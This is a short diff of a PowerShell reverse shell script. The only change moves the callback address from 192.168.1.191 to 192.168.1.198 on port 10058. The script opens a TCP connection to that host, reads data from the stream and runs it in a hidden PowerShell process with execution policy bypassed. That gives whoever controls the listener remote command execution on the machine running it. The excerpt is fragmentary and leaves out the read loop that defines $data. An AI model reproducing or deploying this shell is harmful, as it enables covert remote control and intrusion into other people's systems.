@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient('192.168.1.191', 10058)
+$client = New-Object System.Net.Sockets.TCPClient('192.168.1.198', 10058)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
   Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $data" -Wait -NoNewWindow
